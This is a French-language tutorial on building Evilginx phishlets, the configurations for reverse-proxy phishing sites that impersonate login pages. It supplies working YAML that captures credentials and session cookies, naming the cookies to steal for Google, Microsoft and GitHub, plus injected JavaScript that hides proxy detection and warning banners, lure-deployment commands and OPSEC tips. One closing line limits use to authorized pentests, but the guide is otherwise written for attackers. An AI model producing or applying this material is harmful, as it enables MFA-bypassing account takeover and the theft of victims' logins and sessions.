# 📘 GUIDE COMPLET - STRUCTURE D'UN PHISHLET EVILGINX

## 📁 Structure de Base d'un Phishlet YAML

Un phishlet Evilginx est un fichier de configuration YAML qui définit comment intercepter et proxifier une authentification web.

---

## 🔧 SECTIONS PRINCIPALES

### 1. **METADATA** (Informations de base)

```yaml
name: "google" # Nom unique du phishlet
author: "@votreNom" # Votre identifiant
min_ver: "3.0.0" # Version minimale d'Evilginx requise
```

---

### 2. **PROXY_HOSTS** (Hôtes à proxifier)

Définit tous les domaines/sous-domaines à intercepter :

```yaml
proxy_hosts:
  - phish_sub: "accounts" # Sous-domaine sur VOTRE domaine de phishing
    orig_sub: "accounts" # Sous-domaine ORIGINAL du site cible
    domain: "google.com" # Domaine ORIGINAL cible
    session: true # Capture les cookies de session (true/false)
    is_landing: true # Page de destination finale (true/false)
    auto_filter: true # Filtrage automatique des domaines (true/false)
```

**Paramètres détaillés :**

| Paramètre     | Type   | Description                                        |
| ------------- | ------ | -------------------------------------------------- |
| `phish_sub`   | string | Sous-domaine utilisé sur votre domaine de phishing |
| `orig_sub`    | string | Sous-domaine original du site légitime             |
| `domain`      | string | Domaine racine du site cible                       |
| `session`     | bool   | Si `true`, capture les cookies de session          |
| `is_landing`  | bool   | Si `true`, c'est la page d'arrivée du lure         |
| `auto_filter` | bool   | Active le filtrage automatique des URLs            |

**Exemple concret :**

Si votre domaine de phishing est `phish-domain.com` et vous configurez :

```yaml
- { phish_sub: "accounts", orig_sub: "accounts", domain: "google.com" }
```

Alors :

- `accounts.google.com` → sera proxifié vers `accounts.phish-domain.com`
- Les victimes verront `accounts.phish-domain.com` dans leur navigateur

---

### 3. **SUB_FILTERS** (Filtres de substitution)

Remplace les occurrences de domaines/URLs dans les réponses HTTP :

```yaml
sub_filters:
  - triggers_on: "accounts.google.com" # Active le filtre sur ce domaine
    orig_sub: "accounts" # Sous-domaine à remplacer
    domain: "google.com" # Domaine à remplacer
    search: "accounts.google.com" # Chaîne à rechercher
    replace: "{hostname}" # Remplacer par le hostname de phishing
    mimes: ["text/html", "application/json"] # Types MIME concernés
```

**Variables dynamiques disponibles :**

- `{hostname}` : Hostname complet de phishing (ex: `accounts.phish-domain.com`)
- `{domain}` : Domaine de phishing (ex: `phish-domain.com`)
- `{subdomain}` : Sous-domaine de phishing (ex: `accounts`)

**Types MIME courants :**

```yaml
mimes:
  - "text/html" # Pages HTML
  - "application/json" # Réponses JSON API
  - "application/javascript" # Scripts JavaScript
  - "text/css" # Feuilles de style
  - "text/xml" # Documents XML
```

---

### 4. **AUTH_TOKENS** (Cookies de session à capturer)

Définit les cookies critiques à intercepter :

```yaml
auth_tokens:
  - domain: ".google.com" # Domaine du cookie (avec ou sans point)
    keys: ["SID", "SSID", "HSID"] # Liste des noms de cookies
```

**Types de cookies importants :**

1. **Cookies de session :** Identifient la session utilisateur
2. **Cookies OAuth :** Tokens d'authentification OAuth2
3. **Cookies persistants :** "Remember me", préférences

**Exemples par plateforme :**

```yaml
# Google
- domain: ".google.com"
  keys: ["SID", "SSID", "APISID", "SAPISID", "__Secure-1PSID", "__Secure-3PSID"]

# Microsoft
- domain: ".login.microsoftonline.com"
  keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]

# GitHub
- domain: ".github.com"
  keys: ["user_session", "__Host-user_session_same_site"]
```

---

### 5. **CREDENTIALS** (Capture des identifiants)

Définit comment capturer username et password :

```yaml
credentials:
  username:
    key: "Email" # Nom du champ POST
    search: "(.*)" # Regex de capture (tout capturer)
    type: "post" # Type de requête (post/get)

  password:
    key: "Passwd" # Nom du champ POST
    search: "(.*)" # Regex de capture
    type: "post" # Type de requête
```

**Comment trouver les clés ?**

1. Ouvrir les DevTools du navigateur (F12)
2. Aller à l'onglet **Network**
3. Se connecter au site légitime
4. Chercher la requête POST d'authentification
5. Examiner les **Form Data** ou **Payload**

**Exemple de Form Data capturée :**

```
Email=user@example.com
Passwd=password123
```

---

### 6. **LOGIN** (Configuration de la page de connexion)

Définit l'URL de la page de login :

```yaml
login:
  domain: "accounts.google.com" # Domaine de la page de login
  path: "/ServiceLogin" # Chemin de la page de login
```

**Utilisé pour :**

- Générer les lures correctement
- Rediriger automatiquement les victimes

---

### 7. **FORCE_POST** (Forcer les paramètres POST)

Force certains paramètres dans les requêtes POST :

```yaml
force_post:
  - path: "/signin/v2/challenge/password" # Chemin de la requête
    search: # Paramètres à rechercher
      - { key: "Email", search: "(.*)" }
      - { key: "Passwd", search: "(.*)" }
    force: # Paramètres à forcer
      - { key: "Email", value: "{Email}" }
      - { key: "Passwd", value: "{Passwd}" }
    type: "post"
```

**Cas d'usage :**

- Contourner la validation côté client
- Forcer l'envoi de paramètres cachés
- Modifier les valeurs envoyées

---

### 8. **JS_INJECT** (Injection JavaScript - Pro)

Injecte du JavaScript personnalisé dans les pages :

```yaml
js_inject:
  - trigger_domains: ["accounts.google.com"] # Domaines cibles
    trigger_paths: ["/ServiceLogin"] # Chemins cibles
    trigger_params: ["continue"] # Paramètres URL (optionnel)
    script: |
      // Votre code JavaScript ici
      console.log('Script injecté !');

      // Exemple: Modifier le DOM
      document.getElementById('submit').click();

      // Exemple: Capturer des données supplémentaires
      var username = document.getElementById('email').value;
```

**Usages avancés :**

1. **Contournement de détection :**

```javascript
// Masquer les indicateurs de proxy
delete window.Proxy;
delete window.navigator.webdriver;
```

2. **Manipulation du DOM :**

```javascript
// Cacher un message d'avertissement
document.querySelector(".warning-banner").style.display = "none";
```

3. **Capture de données supplémentaires :**

```javascript
// Envoyer des données à Evilginx
window.addEventListener("load", function () {
  var data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
  };
  // Evilginx capture automatiquement
});
```

---

### 9. **AUTH_URLS** (URLs d'authentification)

Liste des URLs liées au processus d'authentification :

```yaml
auth_urls:
  - "/ServiceLogin"
  - "/signin/v2/identifier"
  - "/signin/v2/challenge/password"
  - "/o/oauth2/auth"
```

**Permet à Evilginx de :**

- Identifier quand une authentification est en cours
- Déclencher la capture de credentials
- Suivre le flow d'authentification

---

### 10. **LANDING_URLS** (URLs de redirection finale)

URLs vers lesquelles rediriger après capture réussie :

```yaml
landing_urls:
  - "/myaccount"
  - "https://mail.google.com"
  - "https://drive.google.com"
```

**Comportement :**

- Après capture des tokens, Evilginx redirige vers une de ces URLs
- Rend l'attaque moins suspecte
- L'utilisateur pense être connecté normalement

---

## 🔍 EXEMPLE COMPLET : PHISHLET SIMPLIFIÉ

```yaml
name: "example"
author: "@hacker"
min_ver: "3.0.0"

proxy_hosts:
  - {
      phish_sub: "login",
      orig_sub: "login",
      domain: "example.com",
      session: true,
      is_landing: true,
    }
  - {
      phish_sub: "api",
      orig_sub: "api",
      domain: "example.com",
      session: false,
      is_landing: false,
    }

sub_filters:
  - {
      triggers_on: "login.example.com",
      orig_sub: "login",
      domain: "example.com",
      search: "login.example.com",
      replace: "{hostname}",
      mimes: ["text/html"],
    }

auth_tokens:
  - domain: ".example.com"
    keys: ["session_id", "auth_token"]

credentials:
  username:
    key: "username"
    search: "(.*)"
    type: "post"
  password:
    key: "password"
    search: "(.*)"
    type: "post"

login:
  domain: "login.example.com"
  path: "/auth"

auth_urls:
  - "/auth"
  - "/login"

landing_urls:
  - "/dashboard"
```

---

## 🛠️ PROCESSUS DE CRÉATION D'UN PHISHLET

### Étape 1 : Analyse du site cible

1. **Identifier tous les domaines utilisés :**

   - Ouvrir DevTools (F12) → Network
   - Charger la page de login
   - Noter tous les domaines chargés

2. **Identifier le flow d'authentification :**

   - Se connecter au site
   - Suivre les requêtes POST
   - Noter les URLs et paramètres

3. **Identifier les cookies de session :**
   - DevTools → Application → Cookies
   - Noter tous les cookies créés après connexion

### Étape 2 : Créer le fichier YAML

1. Créer `mon-phishlet.yaml`
2. Remplir les sections une par une
3. Tester avec Evilginx en local

### Étape 3 : Tests et ajustements

```bash
# Activer le mode debug
evilginx -developer -debug

# Charger le phishlet
phishlets push mon-phishlet

# Configurer le hostname
phishlets set mon-phishlet hostname login.phish-domain.com

# Activer
phishlets enable mon-phishlet

# Créer un lure de test
lures create mon-phishlet /test
```

### Étape 4 : Debugging

**Problèmes courants :**

1. **Ressources non chargées :**

   - Vérifier les `proxy_hosts` manquants
   - Ajouter les domaines CDN/API

2. **Redirections cassées :**

   - Vérifier les `sub_filters`
   - Ajouter des regex plus spécifiques

3. **Cookies non capturés :**

   - Vérifier les noms dans `auth_tokens`
   - Vérifier les domaines (avec/sans point)

4. **Credentials non capturés :**
   - Vérifier les noms de champs POST
   - Ajuster les regex de capture

---

## 📚 RESSOURCES UTILES

### Outils pour analyser les sites

- **Chrome DevTools** : F12 → Network, Application
- **Burp Suite** : Intercepter et analyser le trafic
- **Wireshark** : Analyser le trafic réseau
- **curl** : Tester les requêtes manuellement

### Commandes utiles

```bash
# Tester un redirect
curl -I https://example.com

# Voir les headers
curl -v https://example.com

# Analyser les cookies
curl -c cookies.txt https://example.com
```

### Regex courantes

```yaml
# Capturer tout
search: '(.*)'

# Capturer email
search: '([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'

# Capturer mot de passe (au moins 8 caractères)
search: '(.{8,})'

# Capturer token JWT
search: '(eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)'
```

---

## ⚠️ NOTES IMPORTANTES

1. **Maintenance :** Les sites changent fréquemment, les phishlets doivent être mis à jour
2. **Testing :** TOUJOURS tester en local avant déploiement
3. **OPSEC :** Attention aux logs et traces laissées
4. **Légalité :** Utiliser UNIQUEMENT dans le cadre de pentests autorisés

---

## 🎯 CHECKLIST DE VALIDATION

- [ ] Tous les domaines nécessaires sont dans `proxy_hosts`
- [ ] Les `sub_filters` couvrent toutes les occurrences de domaines
- [ ] Les cookies de session sont dans `auth_tokens`
- [ ] Les champs de credentials sont corrects
- [ ] L'URL de login est exacte
- [ ] Les `auth_urls` couvrent tout le flow
- [ ] Les `landing_urls` sont crédibles
- [ ] Test en local réussi
- [ ] Certificat TLS généré sans erreur
- [ ] Capture de session fonctionne

---

**Fin du guide - Bonne création de phishlets ! 🎣**
